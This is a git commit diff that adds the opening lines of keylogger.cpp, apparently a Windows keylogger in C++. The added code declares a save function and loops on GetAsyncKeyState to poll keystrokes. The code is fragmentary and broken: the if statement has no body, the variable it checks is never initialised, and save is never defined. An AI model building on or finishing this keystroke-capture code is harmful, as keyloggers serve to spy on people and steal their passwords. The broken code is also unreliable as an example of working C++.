92f55efe615236b2e52e2df1a81bc18a768072e4
speedhs <64911433+speedhs@users.noreply.github.com>
2021-06-12 13:58:47 +0530

    Add files via upload

--- keylogger.cpp
+++ keylogger.cpp
@@ -2,4 +2,15 @@
 #include<Windows.h>
 #include<Winuser.H>
 #include<fstream>
- using namespace std;
+using namespace std;
+
+int save(char key,char *file);
+
+int main()
+{
+    char input;
+    while (true)
+    {if(GetAsyncKeyState(input)==-32767)
+    
+    }
+}
